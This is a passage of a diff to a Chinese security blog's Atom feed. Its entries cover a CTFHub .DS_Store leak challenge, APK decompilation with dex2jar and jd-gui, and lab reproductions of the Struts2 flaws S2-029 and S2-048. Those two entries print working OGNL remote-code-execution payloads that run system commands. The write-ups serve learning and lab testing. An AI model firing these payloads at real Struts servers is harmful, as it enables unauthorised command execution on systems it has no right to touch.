alt="image"></p><p>进入Python-dsstore-master目录</p><p>依次输入下图的命令：</p><p>生成.DS_Store.ctfhub（名字可以自定义）</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081821.png" alt="image"></p><p>用Python-dsstore-master目录中的main.py对刚刚生成的文件.DS_Store.ctfhub进行解析。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081822.png" alt="image"></p><p>访问我们看到的.txt文件得到flag</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081823.png" alt="image"></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
     
     
-    <summary type="html">&lt;h2 id=&quot;目录遍历&quot;&gt;&lt;a href=&quot;#目录遍历&quot; class=&quot;headerlink&quot; title=&quot;目录遍历&quot;&gt;&lt;/a&gt;目录遍历&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h3 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h3&gt;&lt;p&gt;许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名。&lt;/p&gt;
-&lt;p&gt;路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名&lt;/p&gt;
-&lt;h3 id=&quot;题解&quot;&gt;&lt;a href=&quot;#题解&quot; class=&quot;headerlink&quot; title=&quot;题解&quot;&gt;&lt;/a&gt;题解&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081802.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;p&gt;点击之后会跳转到flag_in_here这个目录，挨个对里面的目录进行寻找拿到flag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081803.png&quot; alt=&quot;image&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081804.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;h2 id=&quot;PHPINFO&quot;&gt;&lt;a href=&quot;#PHPINFO&quot; class=&quot;headerlink&quot; title=&quot;PHPINFO&quot;&gt;&lt;/a&gt;PHPINFO&lt;/h2&gt;</summary>
+    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
+&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
     
     
     
-    <category term="Web基础" scheme="https://hzktester.top/categories/Web%E5%9F%BA%E7%A1%80/"/>
+    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
     
     
-    <category term="信息泄露" scheme="https://hzktester.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
     
   </entry>
   
@@ -502,30 +552,6 @@
   </entry>
   
   <entry>
-    <title>APP反编译-下载源码</title>
-    <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/"/>
-    <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</id>
-    <published>2020-08-16T07:31:00.000Z</published>
-    <updated>2020-09-18T11:41:04.722Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol><li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li><li>解压<strong>dex2jar.jar</strong>文件</li><li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li><li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li><li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote><p>d2j-dex2jar.bat classes.dex</p></blockquote></li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p><h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol><li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li><li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li><li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;dex2jar工具&quot;&gt;&lt;a href=&quot;#dex2jar工具&quot; class=&quot;headerlink&quot; title=&quot;dex2jar工具&quot;&gt;&lt;/a&gt;dex2jar工具&lt;/h2&gt;&lt;ol&gt;
-&lt;li&gt;下载&lt;a href=&quot;https://sourceforge.net/projects/dex2jar/&quot;&gt;https://sourceforge.net/projects/dex2jar/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;解压&lt;strong&gt;dex2jar.jar&lt;/strong&gt;文件&lt;/li&gt;
-&lt;li&gt;将&lt;strong&gt;shini.apk&lt;/strong&gt;文件后缀名修改为.rar然后解压</summary>
-    
-    
-    
-    <category term="APP渗透" scheme="https://hzktester.top/categories/APP%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
     <title>luac的解密过程</title>
     <link href="https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/"/>
     <id>https://hzktester.top/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</id>
@@ -548,27 +574,6 @@
     
     
     <category term="APP反编译" scheme="https://hzktester.top/tags/APP%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>S2-029 CVE-2016-0785复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
-    <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-27T06:35:29.313Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="Struts2" scheme="https://hzktester.top/tags/Struts2/"/>
     
   </entry>
   
@@ -617,17 +622,16 @@
   </entry>
   
   <entry>
-    <title>S2-048 CVE-2017-9791复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <title>S2-029 CVE-2016-0785复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-27T06:35:25.272Z</updated>
+    <updated>2020-09-27T06:35:29.313Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用vulfoces搭建环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081403.png" alt="image"></li><li>POC利用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>]]></content>
     
     
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。&lt;br&gt;在Struts2中，如下的标签就调用了OGNL进行取值。&lt;/p&gt;</summary>
     
     
     
@@ -639,17 +643,17 @@
   </entry>
   
   <entry>
-    <title>S2-052 CVE-2017-9805复现过程</title>
-    <link href="https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <title>S2-048 CVE-2017-9791复现过程</title>
+    <link href="https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://hzktester.top/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
-    <updated>2020-09-27T06:35:55.106Z</updated>
+    <updated>2020-09-27T06:35:25.272Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p></li><li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p></li></ol>]]></content>
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081407.png" alt="image"></p></li><li><p>随意输入内容，使用burp抓取“submit”的数据包</p></li><li><p>poc利用</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081408.png" alt="image"></p><p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>]]></content>
     
     
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.1.2 - Struts 2.3.33&lt;br&gt;Struts 2.5 - Struts 2.5.12&lt;/p&gt;</summary>
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本&lt;/p&gt;</summary>
     
     
     
